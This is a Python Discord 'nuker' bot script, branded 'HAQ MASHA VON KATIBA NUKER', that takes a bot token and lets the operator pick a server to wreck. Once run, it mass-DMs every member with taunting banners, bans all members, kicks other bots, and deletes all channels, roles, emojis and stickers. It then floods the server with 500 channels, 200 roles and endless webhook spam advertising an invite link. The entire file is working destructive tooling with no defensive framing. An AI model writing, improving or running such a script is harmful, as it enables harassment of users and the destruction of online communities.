import discord
from discord.ext import commands
import asyncio
import os
import random
import time
import aiohttp
import json

os.system('cls' if os.name == 'nt' else 'clear')

print("""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║     ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗  ║
║     ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗ ║
║     ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║ ║
║     ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║ ║
║     ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║ ║
║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ║
║                                                                               ║
║                    ██╗   ██╗ ██████╗ ███╗   ██╗    ██╗  ██╗ █████╗ ██╗   ██╗ ██████╗ ███████╗
║                    ██║   ██║██╔═══██╗████╗  ██║    ██║  ██║██╔══██╗██║   ██║██╔═══██╗██╔════╝
║                    ██║   ██║██║   ██║██╔██╗ ██║    ███████║███████║██║   ██║██║   ██║███████╗
║                    ╚██╗ ██╔╝██║   ██║██║╚██╗██║    ██╔══██║██╔══██║██║   ██║██║   ██║╚════██║
║                     ╚████╔╝ ╚██████╔╝██║ ╚████║    ██║  ██║██║  ██║╚██████╔╝╚██████╔╝███████║
║                      ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
║                                                                               ║
║                         HAQ MASHA VON KATIBA NUKER                            ║
║                     CONSOLE SELECTION MODE v10.0                              ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
""")

# ============================================
# TOKEN INPUT
# ============================================
TOKEN = input("[?] ENTER BOT TOKEN > ")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# ============================================
# MESSAGES
# ============================================
HAQ_MESSAGE = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗ ║
║              ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗║
║              ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║║
║              ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║║
║              ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║║
║              ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝║
║                                                                               ║
║                    ██████╗ ███╗   ██╗    ██╗   ██╗ ██████╗ ███╗   ██╗        ║
║                    ██╔══██╗████╗  ██║    ██║   ██║██╔═══██╗████╗  ██║        ║
║                    ██████╔╝██╔██╗ ██║    ██║   ██║██║   ██║██╔██╗ ██║        ║
║                    ██╔══██╗██║╚██╗██║    ╚██╗ ██╔╝██║   ██║██║╚██╗██║        ║
║                    ██████╔╝██║ ╚████║     ╚████╔╝ ╚██████╔╝██║ ╚████║        ║
║                    ╚═════╝ ╚═╝  ╚═══╝      ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝        ║
║                                                                               ║
║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
║                                                                               ║
║                    YOU HAVE BEEN TERMINATED BY                                ║
║                    HAQ MASHA & VON KATIBA TEAM                                ║
║                                                                               ║
║                    https://discord.gg/c7cgYk4V                                ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

SPAM_LIST = [
    "@everyone **HAQ MASHA VON KATIBA TEAM DESTROYED THIS SERVER**",
    "```VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH```",
    "@everyone **https://discord.gg/c7cgYk4V**",
    "```HAQ MASHA + VON KATIBA = MAXIMUM DESTRUCTION```",
    "**الكتيبة هاق مشا تيم - VON KATIBA**",
    "@everyone **YOUR SERVER IS GONE FOREVER**",
    "```VON KATIBA WAS HERE```",
    "**HAQ MASHA TEAM - VON KATIBA EDITION**",
    "@everyone **VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH**",
    "```YOU HAVE BEEN VON KATIBA'ED```",
    "@everyone **HAQ MASHA KILLED THIS SERVER**",
    "```BYE BYE SERVER```",
    "@everyone **VON KATIBA SAYS: GET REKT**",
    "```ALGERIA HAQ MASHA TEAM```"
]

ROLE_NAMES = ["VON", "KATIBA", "HAQ", "MASHA", "NUKE", "DESTROYER", "DEATH", "TERMINATED", "LMOT", "RA7", "TARJ3", "LOT", "HHHH", "ALGERIA", "HACKER"]

WEBHOOK_NAMES = ["VON-KATIBA", "HAQ-MASHA", "NUKER", "DESTROYER", "SYSTEM", "ALGERIA"]

# ============================================
# VARIABLES
# ============================================
selected_guild = None
selection_mode = False

# ============================================
# MAIN NUKE FUNCTION (MAXIMUM DESTRUCTION)
# ============================================
async def max_nuke(guild, console_only=True):
    start_time = time.time()
    
    print(f"\n{'='*60}")
    print(f"[!] VON KATIBA NUKE STARTED ON: {guild.name}")
    print(f"[!] GUILD ID: {guild.id}")
    print(f"[!] MEMBERS: {len(guild.members)}")
    print(f"{'='*60}\n")
    
    # Get first text channel for messages
    first_channel = None
    for channel in guild.text_channels:
        first_channel = channel
        break
    
    if first_channel:
        await first_channel.send("```🔥 HAQ MASHA + VON KATIBA MAXIMUM NUKE INITIATED 🔥```")
    
    # ============================================
    # PHASE 1: CREATE 150 WEBHOOKS
    # ============================================
    print("[1/12] 🪝 CREATING 150 WEBHOOKS...")
    if first_channel:
        await first_channel.send("**🪝 PHASE 1: CREATING 150 WEBHOOKS**")
    
    webhooks = []
    text_channels = [ch for ch in guild.text_channels][:30]
    
    webhook_count = 0
    for ch in text_channels:
        for i in range(5):
            try:
                webhook = await ch.create_webhook(name=random.choice(WEBHOOK_NAMES))
                webhooks.append(webhook)
                webhook_count += 1
                if webhook_count % 20 == 0:
                    print(f"    CREATED {webhook_count} WEBHOOKS...")
                await asyncio.sleep(0.05)
            except:
                pass
    
    print(f"    ✓ CREATED {len(webhooks)} WEBHOOKS")
    if first_channel:
        await first_channel.send(f"**✅ CREATED {len(webhooks)} WEBHOOKS**")
    
    # ============================================
    # PHASE 2: TORTURE ALL MEMBERS (5 MESSAGES EACH)
    # ============================================
    print("[2/12] 🔪 TORTURING ALL MEMBERS...")
    if first_channel:
        await first_channel.send("**🔪 PHASE 2: TORTURING ALL MEMBERS**")
    
    members = await guild.fetch_members(limit=None).flatten()
    total_humans = len([m for m in members if not m.bot])
    tortured = 0
    
    for member in members:
        if not member.bot:
            try:
                for msg_count in range(5):
                    await member.send(HAQ_MESSAGE)
                    await asyncio.sleep(0.1)
                tortured += 1
                if tortured % 10 == 0:
                    print(f"    TORTURED {tortured}/{total_humans} MEMBERS...")
                    if first_channel:
                        await first_channel.send(f"**TORTURED {tortured}/{total_humans} MEMBERS**")
                await asyncio.sleep(0.05)
            except:
                pass
    
    print(f"    ✓ TORTURED {tortured} MEMBERS")
    if first_channel:
        await first_channel.send(f"**✅ TORTURED {tortured} MEMBERS**")
    
    # ============================================
    # PHASE 3: BAN ALL MEMBERS
    # ============================================
    print("[3/12] 🔨 BANNING ALL MEMBERS...")
    if first_channel:
        await first_channel.send("**🔨 PHASE 3: BANNING ALL MEMBERS**")
    
    banned = 0
    for member in members:
        if not member.bot:
            try:
                await member.ban(reason="VON KATIBA HAQ MASHA", delete_message_days=7)
                banned += 1
                if banned % 20 == 0:
                    print(f"    BANNED {banned}/{total_humans} MEMBERS...")
                    if first_channel:
                        await first_channel.send(f"**BANNED {banned}/{total_humans} MEMBERS**")
                await asyncio.sleep(0.03)
            except:
                pass
    
    print(f"    ✓ BANNED {banned} MEMBERS")
    if first_channel:
        await first_channel.send(f"**✅ BANNED {banned} MEMBERS**")
    
    # ============================================
    # PHASE 4: REMOVE ALL BOTS
    # ============================================
    print("[4/12] 🤖 REMOVING ALL BOTS...")
    if first_channel:
        await first_channel.send("**🤖 PHASE 4: REMOVING ALL BOTS**")
    
    bots_kicked = 0
    for member in members:
        if member.bot and member.id != bot.user.id:
            try:
                await member.kick(reason="HAQ MASHA")
                bots_kicked += 1
                if bots_kicked % 10 == 0:
                    print(f"    REMOVED {bots_kicked} BOTS...")
                await asyncio.sleep(0.03)
            except:
                pass
    
    print(f"    ✓ REMOVED {bots_kicked} BOTS")
    if first_channel:
        await first_channel.send(f"**✅ REMOVED {bots_kicked} BOTS**")
    
    # ============================================
    # PHASE 5: DELETE ALL CHANNELS
    # ============================================
    print("[5/12] 🗑️ DELETING ALL CHANNELS...")
    if first_channel:
        await first_channel.send("**🗑️ PHASE 5: DELETING ALL CHANNELS**")
    
    channels_deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete(reason="VON KATIBA")
            channels_deleted += 1
            if channels_deleted % 50 == 0:
                print(f"    DELETED {channels_deleted} CHANNELS...")
            await asyncio.sleep(0.02)
        except:
            pass
    
    print(f"    ✓ DELETED {channels_deleted} CHANNELS")
    if first_channel:
        await first_channel.send(f"**✅ DELETED {channels_deleted} CHANNELS**")
    
    # ============================================
    # PHASE 6: DELETE ALL ROLES
    # ============================================
    print("[6/12] 🎭 DELETING ALL ROLES...")
    if first_channel:
        await first_channel.send("**🎭 PHASE 6: DELETING ALL ROLES**")
    
    roles_deleted = 0
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete(reason="VON KATIBA")
                roles_deleted += 1
                if roles_deleted % 50 == 0:
                    print(f"    DELETED {roles_deleted} ROLES...")
                await asyncio.sleep(0.02)
            except:
                pass
    
    print(f"    ✓ DELETED {roles_deleted} ROLES")
    if first_channel:
        await first_channel.send(f"**✅ DELETED {roles_deleted} ROLES**")
    
    # ============================================
    # PHASE 7: DELETE ALL EMOJIS & STICKERS
    # ============================================
    print("[7/12] 😀 DELETING EMOJIS & STICKERS...")
    if first_channel:
        await first_channel.send("**😀 PHASE 7: DELETING EMOJIS & STICKERS**")
    
    emojis_deleted = 0
    for emoji in guild.emojis:
        try:
            await emoji.delete()
            emojis_deleted += 1
            await asyncio.sleep(0.02)
        except:
            pass
    
    stickers_deleted = 0
    for sticker in guild.stickers:
        try:
            await sticker.delete()
            stickers_deleted += 1
            await asyncio.sleep(0.02)
        except:
            pass
    
    print(f"    ✓ DELETED {emojis_deleted} EMOJIS & {stickers_deleted} STICKERS")
    if first_channel:
        await first_channel.send(f"**✅ DELETED {emojis_deleted} EMOJIS & {stickers_deleted} STICKERS**")
    
    # ============================================
    # PHASE 8: CHANGE SERVER NAME
    # ============================================
    print("[8/12] 📝 CHANGING SERVER NAME...")
    if first_channel:
        await first_channel.send("**📝 PHASE 8: CHANGING SERVER NAME**")
    
    new_name = random.choice(["VON KATIBA", "HAQ MASHA", "DESTROYED BY VON", "VON-HAQ", "KATIBA-MASHA", "LMOT RA7", "TARJ3 LOT HHHH"])
    try:
        await guild.edit(name=new_name)
        print(f"    ✓ SERVER RENAMED TO: {new_name}")
        if first_channel:
            await first_channel.send(f"**✅ SERVER RENAMED TO: {new_name}**")
    except:
        print("    ✗ FAILED TO RENAME SERVER")
    
    # ============================================
    # PHASE 9: CREATE 500 CHANNELS
    # ============================================
    print("[9/12] 📁 CREATING 500 CHANNELS...")
    if first_channel:
        await first_channel.send("**📁 PHASE 9: CREATING 500 CHANNELS**")
    
    for i in range(500):
        try:
            channel_type = random.choice(["text", "voice"])
            if channel_type == "text":
                await guild.create_text_channel(name=f"von-katiba-{i}")
            else:
                await guild.create_voice_channel(name=f"von-katiba-{i}")
            
            if i % 100 == 0 and i > 0:
                print(f"    CREATED {i} CHANNELS...")
                if first_channel:
                    await first_channel.send(f"**CREATED {i} CHANNELS...**")
            await asyncio.sleep(0.01)
        except:
            pass
    
    print(f"    ✓ CREATED 500 CHANNELS")
    if first_channel:
        await first_channel.send(f"**✅ CREATED 500 CHANNELS**")
    
    # ============================================
    # PHASE 10: CREATE 200 ROLES
    # ============================================
    print("[10/12] 🎭 CREATING 200 ROLES...")
    if first_channel:
        await first_channel.send("**🎭 PHASE 10: CREATING 200 ROLES**")
    
    for i in range(200):
        try:
            await guild.create_role(name=f"{random.choice(ROLE_NAMES)}-{i}", color=discord.Color.red())
            if i % 50 == 0 and i > 0:
                print(f"    CREATED {i} ROLES...")
                if first_channel:
                    await first_channel.send(f"**CREATED {i} ROLES...**")
            await asyncio.sleep(0.01)
        except:
            pass
    
    print(f"    ✓ CREATED 200 ROLES")
    if first_channel:
        await first_channel.send(f"**✅ CREATED 200 ROLES**")
    
    # ============================================
    # PHASE 11: INFINITE SPAM (WEBHOOKS + CHANNELS)
    # ============================================
    print("[11/12] 💬 STARTING INFINITE SPAM...")
    if first_channel:
        await first_channel.send("**💬 PHASE 11: STARTING INFINITE SPAM**")
    
    async def webhook_spam():
        while True:
            for webhook in webhooks:
                try:
                    await webhook.send(random.choice(SPAM_LIST))
                    await asyncio.sleep(0.02)
                except:
                    pass
            await asyncio.sleep(0.1)
    
    async def channel_spam():
        while True:
            for channel in guild.text_channels:
                try:
                    await channel.send(random.choice(SPAM_LIST))
                    await asyncio.sleep(0.02)
                except:
                    pass
            await asyncio.sleep(0.1)
    
    asyncio.create_task(webhook_spam())
    asyncio.create_task(channel_spam())
    
    print("    ✓ INFINITE SPAM STARTED")
    
    # ============================================
    # PHASE 12: FINAL MESSAGE
    # ============================================
    end_time = time.time()
    total_time = round(end_time - start_time, 2)
    
    print("[12/12] 📢 SENDING FINAL MESSAGE...")
    
    final_msg = f"""```diff
+ ╔═══════════════════════════════════════════════════════════════════════════════╗
+ ║                                                                               ║
+ ║                    SERVER DESTROYED BY HAQ MASHA & VON KATIBA                 ║
+ ║                                                                               ║
+ ║                    TARGET: {guild.name[:30]}                                  ║
+ ║                                                                               ║
+ ║                    STATISTICS:                                                ║
+ ║                    • TORTURED: {tortured} MEMBERS                             ║
+ ║                    • BANNED: {banned} MEMBERS                                 ║
+ ║                    • BOTS REMOVED: {bots_kicked}                              ║
+ ║                    • CHANNELS DELETED: {channels_deleted}                     ║
+ ║                    • ROLES DELETED: {roles_deleted}                           ║
+ ║                    • EMOJIS DELETED: {emojis_deleted}                         ║
+ ║                    • WEBHOOKS CREATED: {len(webhooks)}                        ║
+ ║                    • CHANNELS CREATED: 500                                    ║
+ ║                    • ROLES CREATED: 200                                       ║
+ ║                    • TIME: {total_time} SECONDS                               ║
+ ║                                                                               ║
+ ║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
+ ║                                                                               ║
+ ║                    HAQ MASHA TEAM - ALGERIA                                   ║
+ ║                                                                               ║
+ ║                    https://discord.gg/c7cgYk4V                                ║
+ ║                                                                               ║
+ ╚═══════════════════════════════════════════════════════════════════════════════╝
```"""
    
    for channel in guild.text_channels:
        try:
            await channel.send(final_msg)
            break
        except:
            pass
    
    print(f"\n{'='*60}")
    print(f"[✓] VON KATIBA NUKE COMPLETED!")
    print(f"[✓] SERVER: {guild.name}")
    print(f"[✓] TIME: {total_time} SECONDS")
    print(f"[✓] TORTURED & BANNED: {tortured} MEMBERS")
    print(f"{'='*60}\n")

# ============================================
# SELECTION SYSTEM (CONSOLE BASED)
# ============================================
async def select_server_from_console():
    global selected_guild
    
    print("\n" + "═"*70)
    print("                    📋 AVAILABLE SERVERS")
    print("═"*70)
    
    guilds = bot.guilds
    
    if not guilds:
        print("\n❌ NO SERVERS FOUND! BOT IS NOT IN ANY SERVER")
        print("   Make sure you invited the bot to a server first!")
        return None
    
    for i, guild in enumerate(guilds, 1):
        member_count = len(guild.members)
        channel_count = len(guild.channels)
        role_count = len(guild.roles)
        
        print(f"\n  [{i}] ╔═══════════════════════════════════════════════════════════════")
        print(f"      ║ 📛 NAME: {guild.name}")
        print(f"      ║ 🆔 ID: {guild.id}")
        print(f"      ║ 👥 MEMBERS: {member_count}")
        print(f"      ║ 💬 CHANNELS: {channel_count}")
        print(f"      ║ 🎭 ROLES: {role_count}")
        print(f"      ║ 👑 OWNER: {guild.owner}")
        print(f"      ╚═══════════════════════════════════════════════════════════════")
    
    print("\n" + "═"*70)
    
    while True:
        try:
            choice = input("\n📌 SELECT SERVER NUMBER (1-{}): ".format(len(guilds)))
            choice_num = int(choice)
            
            if 1 <= choice_num <= len(guilds):
                selected = guilds[choice_num - 1]
                print(f"\n✅ SELECTED: {selected.name}")
                print(f"🔥 PREPARING MAXIMUM NUKE...")
                
                confirm = input("\n⚠️ ARE YOU SURE? (yes/no): ").lower()
                if confirm == 'yes' or confirm == 'y':
                    return selected
                else:
                    print("❌ NUKE CANCELLED!")
                    return None
            else:
                print(f"❌ INVALID NUMBER! Please enter 1-{len(guilds)}")
        except ValueError:
            print("❌ PLEASE ENTER A VALID NUMBER!")
        except KeyboardInterrupt:
            print("\n\n❌ EXITED BY USER")
            return None

# ============================================
# MAIN BOT EVENT
# ============================================
@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print("""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              ✓ BOT ONLINE: """ + bot.user.name + """
║              ✓ BOT ID: """ + str(bot.user.id) + """
║              ✓ SERVERS: """ + str(len(bot.guilds)) + """
║                                                                               ║
║              VON KATIBA + HAQ MASHA MODE ACTIVATED                           ║
║              MAXIMUM DESTRUCTION READY                                        ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
    """)
    
    # Auto start server selection
    await asyncio.sleep(1)
    selected = await select_server_from_console()
    
    if selected:
        print(f"\n🔥 STARTING MAXIMUM NUKE ON: {selected.name}")
        print("🔥 3...")
        await asyncio.sleep(1)
        print("🔥 2...")
        await asyncio.sleep(1)
        print("🔥 1...")
        await asyncio.sleep(1)
        await max_nuke(selected)
    else:
        print("\n❌ NO SERVER SELECTED. EXITING...")
        await bot.close()

# ============================================
# RUN THE BOT
# ============================================
bot.run(TOKEN)
